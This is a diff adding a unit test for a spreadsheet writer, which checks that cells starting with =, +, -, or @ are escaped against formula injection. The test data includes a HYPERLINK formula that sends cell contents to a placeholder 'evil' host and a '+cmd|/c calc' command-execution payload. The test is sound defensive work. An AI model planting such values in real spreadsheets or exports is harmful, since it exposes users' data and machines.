@@ -112,4 +112,39 @@ describe('writeXlsx', () => {
       { nombre: 'Luis', edad: 25 },
     ])
   })
+
+  it('escapes CSV/Excel formula injection in string cells', async () => {
+    // Cells starting with =, +, -, @, tab or CR are interpreted as formulas
+    // by Excel/LibreOffice. writeXlsx must prefix them with a single quote
+    // so they render as plain text. Numbers/booleans must not be modified.
+    let capturedBlob: Blob | undefined
+    URL.createObjectURL = vi.fn((b: Blob) => { capturedBlob = b; return 'blob:test' })
+
+    await writeXlsx('injection.xlsx', [{
+      name: 'Sheet1',
+      rows: [
+        ['campo', 'valor'],
+        ['formula_eq',  '=HYPERLINK("http://evil/?"&A1,"click")'],
+        ['formula_at',  '@SUM(A1:A99)'],
+        ['formula_plus', '+cmd|/c calc'],
+        ['formula_minus', '-2+3'],
+        ['safe_text', 'normal'],
+        ['number_neg', -42],
+        ['number_pos', 42],
+      ],
+    }])
+
+    const buffer = await capturedBlob!.arrayBuffer()
+    const parsed = await parseXlsxToObjects<{ campo: string; valor: string | number }>(buffer)
+    const byCampo = Object.fromEntries(parsed.map(r => [r.campo, r.valor]))
+
+    expect(byCampo.formula_eq).toMatch(/^'=HYPERLINK/)
+    expect(byCampo.formula_at).toMatch(/^'@SUM/)
+    expect(byCampo.formula_plus).toMatch(/^'\+cmd/)
+    expect(byCampo.formula_minus).toMatch(/^'-2\+3/)
+    expect(byCampo.safe_text).toBe('normal')
+    // Numbers must not be coerced to strings or prefixed.
+    expect(byCampo.number_neg).toBe(-42)
+    expect(byCampo.number_pos).toBe(42)
+  })
 })
